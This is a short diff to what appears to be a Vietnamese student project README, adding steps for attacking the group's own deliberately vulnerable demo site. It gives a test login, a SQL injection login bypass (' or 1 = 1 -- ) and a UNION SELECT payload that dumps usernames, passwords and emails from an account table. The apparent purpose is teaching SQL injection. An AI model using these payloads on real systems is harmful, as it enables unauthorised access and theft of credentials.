@@ -14,3 +14,13 @@ Tác giả:
 NGUYỄN THỊ ANH THƯ- 51900564
 NGUYỄN NGỌC ÁI ĐAN- 31900658
 LÊ TRIỆU VỶ - 51900290
+
+Cách thực hiện:
+web_bitancong: 
+  hình thức 1:
+  tài khoản test: username: "NV01" , password: "123456"   (lấy phần trong "")
+  tấn công: username: "'or 1 = 1 -- " , password: tùy ý
+  hình thức 2:
+  Chọn product trên navigation bar:
+  Nhập "140000' union all select username, password ,firstname  , email, lastname from account1 -- "    (lấy phần trong "")
+  
